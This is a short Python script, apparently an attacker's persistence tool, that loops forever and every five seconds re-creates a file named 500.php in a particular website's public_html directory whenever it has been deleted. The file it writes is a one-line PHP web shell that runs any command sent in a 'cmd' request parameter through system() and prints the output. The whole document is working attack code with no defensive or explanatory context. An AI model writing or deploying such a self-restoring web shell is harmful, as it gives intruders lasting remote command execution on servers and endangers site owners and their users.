import os
import time
import os.path

def main():
    while True:
        f = os.path.exists('/home/admin/web/herepe.askwheel.com/public_html/500.php')
        
        if f == True:
            print("[*] file exists")
            pass
            time.sleep(5)
            
        else:
            print("[!] file not found")
            print("[!] creating file")
            
            a = open('/home/admin/web/herepe.askwheel.com/public_html/500.php','a')
            a.write('<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>')
            a.close()
            time.sleep(5)
main()
